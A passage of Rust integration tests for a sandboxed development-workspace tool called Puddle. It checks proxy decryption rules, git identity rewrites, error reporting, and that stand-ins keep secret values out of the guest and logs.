    host.events().emit(Event::WorkspaceGitChanged {
        workspace: name("beta"),
    });
    // The next change is applied after the damaged one was looked at (events are handled in
    // order), and beta's set did not lose what it had.
    host.events().emit(Event::WorkspaceGitChanged {
        workspace: name("beta"),
    });
    // The user is told: the old set stays and the next change tries again.
    eventually("the failed update is a problem", APPLY, || {
        has_problem(&host, "git-decrypt:beta")
    })
    .await;
    let problem = problem_of(&host, "git-decrypt:beta");
    assert_eq!(problem.title, "Puddle could not update what beta decrypts");
    assert!(
        problem.detail.contains("cannot read beta's Git settings")
            && problem.detail.contains("keeps the credentials it had"),
        "{}",
        problem.detail
    );
    assert!(decrypts(&host, "beta", "github.com"));

    // Once the settings read again, the next change takes the problem away.
    damage_database(
        &rig,
        "DELETE FROM workspace_repos WHERE repo = 'not a repo'",
    );
    host.events().emit(Event::WorkspaceGitChanged {
        workspace: name("beta"),
    });
    eventually("the problem ends", APPLY, || {
        !has_problem(&host, "git-decrypt:beta")
    })
    .await;
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_rule_on_method_and_path_reaches_the_running_workspaces_and_decrypts_its_host() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    assert!(!decrypts(&host, "acme", "api.example.com"));

    // A rule for every workspace: the running one decrypts the host from then on.
    let made = api
        .post(
            "/api/request-rules",
            r#"{"host": "api.example.com", "methods": ["DELETE"], "path": "/repos/**"}"#,
        )
        .await;
    assert_eq!(made.status, 201, "{}", made.body);
    eventually("the rule's host is decrypted", APPLY, || {
        decrypts(&host, "acme", "api.example.com")
    })
    .await;

    // Deleting it takes the host out of the set again.
    let gone = api.delete("/api/request-rules/1", None).await;
    assert_eq!(gone.status, 200, "{}", gone.body);
    eventually("the host is no longer decrypted", APPLY, || {
        !decrypts(&host, "acme", "api.example.com")
    })
    .await;
    host.shutdown().await;
}

fn has_problem(host: &Host<FakeRuntime>, key: &str) -> bool {
    host.problems().list().iter().any(|p| p.key == key)
}

fn problem_of(host: &Host<FakeRuntime>, key: &str) -> puddle_types::Problem {
    let found = host.problems().list().into_iter().find(|p| p.key == key);
    assert!(
        found.is_some(),
        "no problem {key}: {:?}",
        host.problems().list()
    );
    found.unwrap()
}

#[tokio::test(flavor = "multi_thread")]
async fn an_image_the_boot_plan_cannot_take_fails_the_start_and_leaves_nothing_behind() {
    let rig = Rig::new();
    let odd = ImageRef::new("example.org/odd:1").unwrap();
    rig.runtime.add_image(
        &odd,
        ImageConfig {
            // A newline cannot be written into the guest's environment file.
            env: vec![("PATH".to_owned(), "/bin\n/usr/bin".to_owned())],
            ..ImageConfig::default()
        },
    );
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    let reply = api
        .post(
            "/api/workspaces",
            &json!({"name": "acme", "repositories": [{"url": REPO}], "image": "example.org/odd:1"})
                .to_string(),
        )
        .await;
    assert_eq!(reply.status, 202, "{}", reply.body);
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "failed", "{end}");
    assert!(host.workspaces().termination(&name("acme")).is_none());
    assert!(rig.runtime.list().await.unwrap().is_empty());
    assert!(rig.runtime.list_volumes().await.unwrap().is_empty());
    host.shutdown().await;
}

/// Attaches a new identity to `workspace`, as a user clicking would.
fn attach_a_new_identity(store: &puddle_store::Store, workspace: &WorkspaceName) {
    let host = puddle_secrets::HostName::new("github.com").unwrap();
    let credential = puddle_store::CredentialBinding::new(
        &host,
        puddle_secrets::SourceSpec::Gh {
            host: host.clone(),
            account: puddle_secrets::AccountName::new("me").unwrap(),
        },
        puddle_store::Coverage::new(std::collections::BTreeSet::new(), true).unwrap(),
    )
    .unwrap();
    let identity = store
        .create_identity(puddle_store::IdentityDraft {
            label: "Ada".to_owned(),
            author: puddle_store::Author::new("Ada", "ada@example.org").unwrap(),
            credentials: vec![credential],
        })
        .unwrap();
    // The first identity becomes the default, which a new workspace gets at its create; attach
    // is idempotent for this test's purpose.
    let _ = store.attach_identity(workspace, identity.id, None);
}

/// Makes the next run of the boot hook attach a new identity to `workspace`, as a user clicking
/// while the guest boots would.
fn attach_during_the_next_boot(rig: &Rig, host: &Host<FakeRuntime>, workspace: &str) {
    let store = host.store().clone();
    let workspace = name(workspace);
    *rig.guest.during_boot.lock().unwrap() =
        Some(Box::new(move || attach_a_new_identity(&store, &workspace)));
}

#[tokio::test(flavor = "multi_thread")]
async fn a_change_made_while_the_guest_boots_reaches_it_once_it_is_up() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    // No identity exists when the workspace is created, so its plan names no author.
    attach_during_the_next_boot(&rig, &host, "acme");
    create(&api, &mut events, "acme").await;

    // The set followed while the guest was booting, and once it was up the guest was brought in
    // line with a second run of the hook.
    assert!(decrypts(&host, "acme", "github.com"));
    rig.guest.boots_reach(2).await;
    let first = rig.guest.plan_files(0);
    assert!(!pem_of(&first, "/etc/puddle/gitconfig").contains("[user]"));
    let files = rig.guest.plan_files(rig.guest.boots() - 1);
    assert!(pem_of(&files, "/etc/puddle/gitconfig").contains("name = \"Ada\""));
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_change_made_while_a_stopped_workspace_starts_again_reaches_it_once_it_is_up() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let booted = rig.guest.boots();

    attach_during_the_next_boot(&rig, &host, "acme");
    api.post("/api/workspaces/acme/start", "").await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "done", "{end}");
    assert!(decrypts(&host, "acme", "github.com"));
    rig.guest.boots_reach(booted + 2).await;
    let files = rig.guest.plan_files(rig.guest.boots() - 1);
    assert!(pem_of(&files, "/etc/puddle/gitconfig").contains("name = \"Ada\""));
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn settings_that_turn_unreadable_during_a_boot_do_not_fail_the_boot() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    let db = rig.dir.path().join("data").join("puddle.db");
    *rig.guest.during_boot.lock().unwrap() = Some(Box::new(move || {
        let db = rusqlite::Connection::open(db).unwrap();
        db.execute_batch(&UNREADABLE_GIT_ROW.replace("{}", "acme"))
            .unwrap();
    }));
    // The boot had what it needed; the workspace comes up with the settings it started with.
    create(&api, &mut events, "acme").await;
    assert!(host.workspaces().termination(&name("acme")).is_some());
    assert_eq!(rig.guest.boots(), 1);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_guest_that_cannot_take_new_authors_keeps_the_old_ones_and_the_next_change_retries() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let booted = rig.guest.boots();
    let ada = make_identity(&api, "Ada", "github.com", &[]).await;
    let bob = make_identity(&api, "Bob", "gitlab.com", &[]).await;

    rig.guest.fail_boot.store(true, Ordering::SeqCst);
    attach(&api, "acme", ada).await;
    rig.guest.boots_reach(booted + 1).await;
    // What is decrypted followed anyway: only the guest's files could not be written.
    eventually("github.com decrypted", APPLY, || {
        decrypts(&host, "acme", "github.com")
    })
    .await;
    // The user is told, with the guest's reason.
    eventually("the failed rewrite is a problem", APPLY, || {
        has_problem(&host, "git-authors:acme")
    })
    .await;
    let problem = problem_of(&host, "git-authors:acme");
    assert_eq!(
        problem.title,
        "Puddle could not update the commit authors in acme"
    );
    assert!(
        problem.detail.contains("boot.sh: no disk"),
        "{}",
        problem.detail
    );

    rig.guest.fail_boot.store(false, Ordering::SeqCst);
    attach(&api, "acme", bob).await;
    rig.guest.boots_reach(booted + 2).await;
    eventually("the retry takes the problem away", APPLY, || {
        !has_problem(&host, "git-authors:acme")
    })
    .await;
    let files = rig.guest.plan_files(rig.guest.boots() - 1);
    let config = pem_of(&files, "/etc/puddle/gitconfig");
    // Both identities are in the retry: the first change was never written.
    assert!(config.contains("name = \"Ada\""), "{config}");
    assert!(pem_of(&files, "/etc/puddle/git-author-1.gitconfig").contains("Bob"));
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn settings_that_go_unreadable_while_a_rewrite_waits_are_a_problem_the_next_change_ends() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let booted = rig.guest.boots();
    let ada = make_identity(&api, "Ada", "github.com", &[]).await;
    let bob = make_identity(&api, "Bob", "gitlab.com", &[]).await;

    // Ada's rewrite holds the guest in its boot hook, so Bob's change reads what it decrypts and
    // then waits for the rewrite to end.
    let (release, hold) = std::sync::mpsc::channel::<()>();
    let hold = Mutex::new(hold);
    *rig.guest.during_boot.lock().unwrap() = Some(Box::new(move || {
        wait_for(&hold.lock().unwrap());
    }));
    attach(&api, "acme", ada).await;
    rig.guest.boots_reach(booted + 1).await;
    attach(&api, "acme", bob).await;
    eventually("gitlab.com decrypted", APPLY, || {
        decrypts(&host, "acme", "gitlab.com")
    })
    .await;

    // The settings go bad before Bob's rewrite can read them.
    damage_database(&rig, &UNREADABLE_GIT_ROW.replace("{}", "acme"));
    release.send(()).unwrap();
    eventually("the failed rewrite is a problem", APPLY, || {
        has_problem(&host, "git-authors:acme")
    })
    .await;
    let problem = problem_of(&host, "git-authors:acme");
    assert_eq!(
        problem.title,
        "Puddle could not update the commit authors in acme"
    );
    assert!(
        problem.detail.contains("cannot read acme's Git settings")
            && problem
                .detail
                .contains("the next change to its identities tries again"),
        "{}",
        problem.detail
    );

    // Once the settings read again, the next change writes both authors and ends the problem.
    damage_database(
        &rig,
        "DELETE FROM workspace_repos WHERE repo = 'not a repo'",
    );
    host.events().emit(Event::WorkspaceGitChanged {
        workspace: name("acme"),
    });
    eventually("the retry takes the problem away", APPLY, || {
        !has_problem(&host, "git-authors:acme")
    })
    .await;
    let files = rig.guest.plan_files(rig.guest.boots() - 1);
    assert!(pem_of(&files, "/etc/puddle/git-author-1.gitconfig").contains("Bob"));
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_git_too_old_for_the_author_rules_is_a_problem_until_it_is_updated() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let booted = rig.guest.boots();
    let ada = make_identity(&api, "Ada", "github.com", &["acme"]).await;
    let bob = make_identity(&api, "Bob", "gitlab.com", &["labs"]).await;

    // The guest's git is from before `includeIf hasconfig`: the rules are written and ignored.
    *rig.guest.boot_says.lock().unwrap() = "puddle-boot: git version 2.34.1\n".to_owned();
    attach(&api, "acme", ada).await;
    rig.guest.boots_reach(booted + 1).await;
    eventually("the old git is a problem", APPLY, || {
        has_problem(&host, "git-old:acme")
    })
    .await;
    let problem = problem_of(&host, "git-old:acme");
    assert_eq!(
        problem.title,
        "git 2.34 in acme ignores the commit author rules"
    );
    assert!(
        problem.detail.contains("2.36") && problem.detail.contains("first identity's author"),
        "{}",
        problem.detail
    );

    // A git that reads them, at the next rewrite, ends it.
    *rig.guest.boot_says.lock().unwrap() = "puddle-boot: git version 2.39.5\n".to_owned();
    attach(&api, "acme", bob).await;
    rig.guest.boots_reach(booted + 2).await;
    eventually("the problem ends", APPLY, || {
        !has_problem(&host, "git-old:acme")
    })
    .await;

    // And a stopped workspace has none.
    *rig.guest.boot_says.lock().unwrap() = "puddle-boot: git version 2.30.2\n".to_owned();
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert!(!has_problem(&host, "git-old:acme"));
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_git_too_old_is_noticed_at_a_start_too_but_only_when_author_rules_exist() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    // No identity yet, so no rule for the old git to ignore.
    *rig.guest.boot_says.lock().unwrap() = "puddle-boot: git version 2.30.2\n".to_owned();
    create(&api, &mut events, "acme").await;
    assert!(!has_problem(&host, "git-old:acme"));
    let ada = make_identity(&api, "Ada", "github.com", &["acme"]).await;

    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    attach(&api, "acme", ada).await;
    *rig.guest.boot_says.lock().unwrap() = "puddle-boot: git version 2.30.2\n".to_owned();
    api.post("/api/workspaces/acme/start", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert!(
        has_problem(&host, "git-old:acme"),
        "{:?}",
        host.problems().list()
    );
    host.shutdown().await;
}

/// A binding the store would refuse today, as an older database holds it.
fn old_binding_on_port(host_name: &str) -> puddle_store::CredentialBinding {
    serde_json::from_value(json!({
        "host": host_name,
        "source": {"kind": "gh", "host": host_name, "account": "me"},
        "covers": {"owners": [], "rest_of_host": true}
    }))
    .unwrap()
}

#[tokio::test(flavor = "multi_thread")]
async fn a_credential_for_a_port_puddle_never_decrypts_is_refused_and_an_old_one_is_a_problem() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;

    // Saving one is refused with the reason.
    let body = json!({
        "label": "Ada",
        "author": {"name": "Ada", "email": "ada@example.org"},
        "credentials": [{
            "host": "ghe.example:8443",
            "source": {"kind": "gh", "host": "ghe.example:8443", "account": "me"},
            "covers": {"owners": [], "rest_of_host": true}
        }]
    });
    let reply = api.post("/api/identities", &body.to_string()).await;
    assert_eq!(reply.status, 422, "{}", reply.body);
    assert!(
        reply.body.contains("port 8443") && reply.body.contains("never be used"),
        "{}",
        reply.body
    );

    // One a database from before already holds is said to be useless, while its workspace runs.
    let old = host
        .store()
        .create_identity(puddle_store::IdentityDraft {
            label: "Old".to_owned(),
            author: puddle_store::Author::new("Old", "old@example.org").unwrap(),
            credentials: vec![old_binding_on_port("ghe.example:8443")],
        })
        .unwrap();
    host.store()
        .attach_identity(&name("acme"), old.id, None)
        .unwrap();
    host.events().emit(Event::WorkspaceGitChanged {
        workspace: name("acme"),
    });
    eventually("the useless credential is a problem", APPLY, || {
        has_problem(&host, "git-credentials:acme")
    })
    .await;
    let problem = problem_of(&host, "git-credentials:acme");
    assert_eq!(problem.title, "acme has credentials Puddle never uses");
    assert!(
        problem.detail.contains("ghe.example:8443"),
        "{}",
        problem.detail
    );
    assert!(!decrypts(&host, "acme", "ghe.example"));

    // Detached, it ends.
    host.store().detach_identity(&name("acme"), old.id).unwrap();
    host.events().emit(Event::WorkspaceGitChanged {
        workspace: name("acme"),
    });
    eventually("the problem ends", APPLY, || {
        !has_problem(&host, "git-credentials:acme")
    })
    .await;
    host.shutdown().await;
}

/// Holds the next author rewrite that starts back at the host's gate until `release`, and says
/// when it has ended.
#[derive(Default)]
struct HeldRewrite {
    armed: AtomicBool,
    arrived: AtomicBool,
    ended: AtomicBool,
    release: tokio::sync::Notify,
}

/// Dropped when the rewrite the gate let on ends; says so if it was the held one.
struct RewriteEnd(Option<Arc<HeldRewrite>>);

impl Drop for RewriteEnd {
    fn drop(&mut self) {
        if let Some(held) = &self.0 {
            held.ended.store(true, Ordering::SeqCst);
        }
    }
}

impl HeldRewrite {
    fn gate(self: &Arc<Self>) -> RewriteGate {
        let held = self.clone();
        Arc::new(move |_| {
            let held = held.clone();
            Box::pin(async move {
                let this_one = held.armed.swap(false, Ordering::SeqCst);
                if this_one {
                    held.arrived.store(true, Ordering::SeqCst);
                    held.release.notified().await;
                }
                Box::new(RewriteEnd(this_one.then_some(held))) as Box<dyn Send>
            })
        })
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn an_author_rewrite_that_runs_after_a_newer_change_applies_the_newest_settings() {
    let rig = Rig::new();
    let held = Arc::new(HeldRewrite::default());
    *rig.rewrite_gate.lock().unwrap() = Some(held.gate());
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let booted = rig.guest.boots();
    let old = host
        .store()
        .create_identity(puddle_store::IdentityDraft {
            label: "Old".to_owned(),
            author: puddle_store::Author::new("Old", "old@example.org").unwrap(),
            credentials: vec![old_binding_on_port("ghe.example:8443")],
        })
        .unwrap();

    // The store announces each change itself. The rewrite for the attach starts first and waits at the gate.
    held.armed.store(true, Ordering::SeqCst);
    host.store()
        .attach_identity(&name("acme"), old.id, None)
        .unwrap();
    eventually("the attach rewrite waits", APPLY, || {
        held.arrived.load(Ordering::SeqCst)
    })
    .await;
    // The detach comes after, and its rewrite runs through: nothing is left to rewrite or to say.
    host.store().detach_identity(&name("acme"), old.id).unwrap();
    eventually("the detach ends the problem", APPLY, || {
        !has_problem(&host, "git-credentials:acme")
    })
    .await;

    // The attach rewrite now goes on, last. It must apply the settings as they are now.
    held.release.notify_one();
    eventually("the attach rewrite ends", APPLY, || {
        held.ended.load(Ordering::SeqCst)
    })
    .await;
    assert!(
        !has_problem(&host, "git-credentials:acme"),
        "{:?}",
        host.problems().list()
    );
    assert_eq!(rig.guest.boots(), booted, "the old author was written back");
    host.shutdown().await;
}

#[tokio::test]
async fn missed_events_are_made_up_for_by_looking_at_every_running_workspace_again() {
    // One thread: the host's tasks cannot run while this test emits, so the follower falls
    // behind the event buffer.
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let identity = make_identity(&api, "Ada", "github.com", &[]).await;
    let before = rig.guest.boots();

    let attached =
        host.store()
            .attach_identity(&name("acme"), puddle_store::IdentityId(identity), None);
    attached.unwrap();
    for _ in 0..4096 {
        host.events().emit(Event::RulesChanged {});
    }
    eventually("the set follows", APPLY, || {
        decrypts(&host, "acme", "github.com")
    })
    .await;
    rig.guest.boots_reach(before + 1).await;
    host.shutdown().await;
}

// ---- environment variables and secrets --------------------------------------------------------

const REAL: &str = "ghp_CANARY-real-value-in-the-credential-store";

async fn put_env(api: &Api, path: &str, body: serde_json::Value) {
    let reply = api.put(path, &body.to_string()).await;
    assert_eq!(reply.status, 200, "{path}: {}", reply.body);
}

fn secret_body(value: Option<&str>, hosts: &[&str]) -> serde_json::Value {
    match value {
        Some(value) => json!({"kind": "secret", "value": value, "hosts": hosts}),
        None => json!({"kind": "secret", "hosts": hosts}),
    }
}

/// The stand-in `workspace` holds for the secret `var`, as the store keeps it.
fn stand_in_of(host: &Host<FakeRuntime>, workspace: &str, var: &str) -> String {
    let vars = host
        .store()
        .env_for_start(&name(workspace), &mut |_| Err("already made".into()))
        .unwrap();
    let found = vars
        .into_iter()
        .find(|v| v.name.as_str() == var)
        .and_then(|v| match v.value {
            puddle_store::StartValue::Secret { stand_in, .. } => Some(stand_in),
            puddle_store::StartValue::Plain(_) => None,
        });
    assert!(found.is_some(), "no secret {var} in {workspace}");
    found.unwrap()
}

/// Whether `needle` is anywhere in what the guest was sent or made with: every boot plan, every
/// sandbox environment and every command.
fn guest_has(rig: &Rig, needle: &str) -> bool {
    let plans = rig.guest.plans.lock().unwrap();
    let in_plans = plans
        .iter()
        .any(|(_, plan)| plan.windows(needle.len()).any(|w| w == needle.as_bytes()));
    let in_envs = rig.guest.boot_envs.lock().unwrap().iter().any(|env| {
        env.iter()
            .any(|(k, v)| k.contains(needle) || v.contains(needle))
    });
    let in_commands = rig.guest.commands().iter().any(|c| c.contains(needle));
    in_plans || in_envs || in_commands
}

#[tokio::test(flavor = "multi_thread")]
async fn a_workspace_starts_with_its_variables_and_a_stand_in_for_each_secret_and_the_real_value_never_reaches_the_guest()
 {
    let logs = support::capture_logs();
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    put_env(
        &api,
        "/api/env/EDITOR",
        json!({"kind": "plain", "value": "vim"}),
    )
    .await;
    put_env(
        &api,
        "/api/env/NPM_TOKEN",
        secret_body(Some(REAL), &["registry.example.org"]),
    )
    .await;
    create(&api, &mut events, "acme").await;
    put_env(
        &api,
        "/api/workspaces/acme/env/API_KEY",
        secret_body(Some(REAL), &["api.example.org", "*.example.net"]),
    )
    .await;
    // The second secret was added to a running workspace: its stand-in reaches the guest at the
    // next start, so start again to see it in the guest.
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    api.post("/api/workspaces/acme/start", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;

    let env = rig.guest.boot_envs.lock().unwrap().last().cloned().unwrap();
    assert_eq!(env.get("EDITOR"), Some("vim"));
    let npm = env.get("NPM_TOKEN").unwrap();
    let key = env.get("API_KEY").unwrap();
    assert!(npm.starts_with("puddle-secret-NPM_TOKEN-"), "{npm}");
    assert!(key.starts_with("puddle-secret-API_KEY-"), "{key}");
    assert_eq!(npm, stand_in_of(&host, "acme", "NPM_TOKEN"));
    // Puddle's own variables are still there beside them.
    assert_eq!(env.get("HTTPS_PROXY"), Some("http://127.0.0.1:3128"));
    // Login shells see the same through the env file.
    let files = rig.guest.plan_files(rig.guest.boots() - 1);
    let file = pem_of(&files, "/etc/profile.d/01-puddle-env.sh");
    assert!(
        file.contains(&format!("export NPM_TOKEN='{npm}'")),
        "{file}"
    );
    assert!(file.contains("export EDITOR='vim'"), "{file}");

    // The proxy holds both, for their own hosts, and decrypts those hosts.
    let termination = host.workspaces().termination(&name("acme")).unwrap();
    assert_eq!(
        termination.stand_ins().ids(),
        ["stand-in:secret:API_KEY", "stand-in:secret:NPM_TOKEN"]
    );
    for site in ["registry.example.org", "api.example.org", "x.example.net"] {
        assert!(decrypts(&host, "acme", site), "{site}");
    }
    assert!(!decrypts(&host, "acme", "example.net"));

    // The real value is in the credential store and nowhere the guest or a log has been.
    assert_eq!(rig.secrets.ids().len(), 2);
    assert!(!guest_has(&rig, REAL), "the real value reached the guest");
    assert!(
        !guest_has(&rig, "CANARY"),
        "a piece of the real value reached the guest"
    );
    let logged = String::from_utf8_lossy(&logs.lock().unwrap()).into_owned();
    assert!(!logged.contains("CANARY"), "the real value was logged");
    host.shutdown().await;
    let logged = String::from_utf8_lossy(&logs.lock().unwrap()).into_owned();
    assert!(
        !logged.contains("CANARY"),
        "the real value was logged at shutdown"
    );
}

#[expect(clippy::too_many_lines, reason = "one story, read top to bottom")]
#[tokio::test(flavor = "multi_thread")]
async fn a_secret_added_to_a_running_workspace_is_decrypted_from_the_next_connection_with_no_restart()
 {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    create(&api, &mut events, "beta").await;
    let ca_before = host
        .workspaces()
        .termination(&name("acme"))
        .unwrap()
        .ca()
        .certificate()
        .clone();
    let registry_before = host.workspaces().termination(&name("acme")).unwrap();
    let beta_commands = rig
        .guest
        .commands()
        .iter()
        .filter(|c| c.starts_with("beta "))
        .count();
    let (creates, starts, stops) = (
        calls_of(&rig, "Create"),
        calls_of(&rig, "Start"),
        calls_of(&rig, "Stop"),
    );
    assert!(!decrypts(&host, "acme", "api.example.org"));

    // A host the workspace has never used and no identity names.
    put_env(
        &api,
        "/api/workspaces/acme/env/API_KEY",
        secret_body(Some(REAL), &["api.example.org"]),
    )
    .await;
    eventually("the secret's host is decrypted", APPLY, || {
        decrypts(&host, "acme", "api.example.org")
    })
    .await;
    let after = host.workspaces().termination(&name("acme")).unwrap();
    assert_eq!(after.stand_ins().ids(), ["stand-in:secret:API_KEY"]);
    // The same CA and the same registry: the guest's trust is unchanged and open connections see
    // the new stand-in too.
    assert_eq!(after.ca().certificate(), &ca_before);
    assert!(Arc::ptr_eq(registry_before.stand_ins(), after.stand_ins()));
    // Only that workspace, and nothing was started or stopped. (The login-shell file is rewritten
    // for a change to the variables, which runs the boot plan again in that guest alone; the next
    // test is about that.)
    assert!(!decrypts(&host, "beta", "api.example.org"));
    assert_eq!(
        rig.guest
            .commands()
            .iter()
            .filter(|c| c.starts_with("beta "))
            .count(),
        beta_commands,
        "beta's guest was not touched"
    );
    assert_eq!(
        (
            calls_of(&rig, "Create"),
            calls_of(&rig, "Start"),
            calls_of(&rig, "Stop")
        ),
        (creates, starts, stops)
    );

    // A global secret reaches every running workspace.
    put_env(
        &api,
        "/api/env/SHARED",
        secret_body(Some(REAL), &["shared.example.org"]),
    )
    .await;
    for workspace in ["acme", "beta"] {
        eventually("the global secret's host is decrypted", APPLY, || {
            decrypts(&host, workspace, "shared.example.org")
        })
        .await;
    }
    // Each holds its own stand-in for it.
    assert_ne!(
        stand_in_of(&host, "acme", "SHARED"),
        stand_in_of(&host, "beta", "SHARED")
    );

    // Changed hosts move the decrypted host; removing the secret takes it out again.
    put_env(
        &api,
        "/api/workspaces/acme/env/API_KEY",
        secret_body(None, &["other.example.org"]),
    )
    .await;
    eventually("the hosts moved", APPLY, || {
        decrypts(&host, "acme", "other.example.org") && !decrypts(&host, "acme", "api.example.org")
    })
    .await;
    assert_eq!(
        api.delete("/api/workspaces/acme/env/API_KEY", None)
            .await
            .status,
        204
    );
    assert_eq!(api.delete("/api/env/SHARED", None).await.status, 204);
    eventually("removed secrets are not decrypted", APPLY, || {
        !decrypts(&host, "acme", "other.example.org")
            && !decrypts(&host, "acme", "shared.example.org")
            && !decrypts(&host, "beta", "shared.example.org")
    })
    .await;
    assert!(
        host.workspaces()
            .termination(&name("acme"))
            .unwrap()
            .stand_ins()
            .ids()
            .is_empty()
    );
    assert!(
        rig.secrets.ids().is_empty(),
        "no value left in the credential store"
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_changed_environment_makes_the_next_start_a_new_sandbox_on_the_same_volume_and_an_unchanged_one_restarts_it()
 {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    put_env(
        &api,
        "/api/env/EDITOR",
        json!({"kind": "plain", "value": "vim"}),
    )
    .await;
    create(&api, &mut events, "acme").await;
    let volumes = volume_names(&rig).await;
    assert_eq!(
        rig.guest.boot_envs.lock().unwrap()[0].get("EDITOR"),
        Some("vim")
    );

    // Nothing changed: the stopped sandbox is started again, not made again.
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let creates = calls_of(&rig, "Create");
    api.post("/api/workspaces/acme/start", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(calls_of(&rig, "Create"), creates);
    assert_eq!(calls_of(&rig, "Remove"), 0);

    // A changed variable: a sandbox keeps the environment it was made with, so the start makes
    // a new one; the volume with the work is the same.
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    put_env(
        &api,
        "/api/env/EDITOR",
        json!({"kind": "plain", "value": "nano"}),
    )
    .await;
    api.post("/api/workspaces/acme/start", "").await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "done", "{end}");
    assert_eq!(calls_of(&rig, "Create"), creates + 1);
    assert_eq!(calls_of(&rig, "Remove"), 1);
    // Puddle says what it did: the sandbox was made again, the volume kept.
    let said = events.seen.iter().any(|e| {
        e["type"] == "workspace_progress"
            && e["detail"]
                .as_str()
                .is_some_and(|d| d.contains("variables changed") && d.contains("volume"))
    });
    assert!(said, "no notice that the sandbox was made again");
    assert_eq!(
        rig.guest
            .boot_envs
            .lock()
            .unwrap()
            .last()
            .unwrap()
            .get("EDITOR"),
        Some("nano")
    );
    assert_eq!(volume_names(&rig).await, volumes);
    assert!(host.workspaces().termination(&name("acme")).is_some());

    // And from then on that is the environment the sandbox was made with.
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    api.post("/api/workspaces/acme/start", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(calls_of(&rig, "Create"), creates + 1);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_stand_in_is_the_same_at_every_start_so_files_the_workspace_wrote_with_it_keep_working() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    put_env(
        &api,
        "/api/env/TOKEN",
        secret_body(Some(REAL), &["a.example.org"]),
    )
    .await;
    create(&api, &mut events, "acme").await;
    let first = rig
        .guest
        .boot_envs
        .lock()
        .unwrap()
        .last()
        .unwrap()
        .get("TOKEN")
        .unwrap()
        .to_owned();
    // A new value and new hosts keep it.
    put_env(
        &api,
        "/api/env/TOKEN",
        secret_body(Some("rotated"), &["b.example.org"]),
    )
    .await;
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    api.post("/api/workspaces/acme/start", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let second = rig
        .guest
        .boot_envs
        .lock()
        .unwrap()
        .last()
        .unwrap()
        .get("TOKEN")
        .unwrap()
        .to_owned();
    assert_eq!(first, second);
    assert_eq!(
        calls_of(&rig, "Create"),
        1,
        "same environment, so the same sandbox restarted"
    );
    // The stand-in survives a restart of Puddle too: it is in the database.
    host.shutdown().await;
    // The next start is a new process: the first one's hold on the data folder ends.
    drop(host);
    let host = rig.start().await;
    assert_eq!(stand_in_of(&host, "acme", "TOKEN"), first);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_start_whose_secret_cannot_be_read_fails_naming_it_and_works_once_it_is_set_again() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    put_env(
        &api,
        "/api/env/TOKEN",
        secret_body(Some(REAL), &["a.example.org"]),
    )
    .await;
    // The value is gone from the credential store (the data folder came from another computer).
